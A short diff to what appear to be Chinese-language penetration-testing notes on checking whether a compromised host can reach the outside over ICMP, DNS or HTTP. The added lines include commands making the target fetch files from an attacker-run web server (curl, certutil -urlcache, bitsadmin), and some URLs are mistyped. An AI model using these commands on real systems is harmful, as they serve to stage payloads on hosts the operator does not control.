@@ -16,5 +16,25 @@
     然后再扫端口
     恢复的话：
     iptables -t nat -F 清楚所有iptables规则
+如果禁止出网协议
 出网协议有3种：
 icmp,dns,http
+
+icmp：
+  ping www.baidu.com
+    如果有回复，则说明icmp出网
+  或者在攻击机建立icmp
+    tcpdump icmp
+    然后ping 攻击机ip，有回复则出网
+dns：
+    ping www.baidu.comm
+    如果能将网址解析为ip，则dns出网 
+    nslookup www.baidu.com  同上
+    dig www.baidu.com 同上
+http:
+    攻击机：
+    python -m SimpleHTTPServer 8888
+    目标主机访问攻击机网站 ：curl http://ip:8888
+    windows:   certutil -urlcache -split -f http:ip:8888
+            bitsadmin /transfer test http:ip:8888 c:\
+             
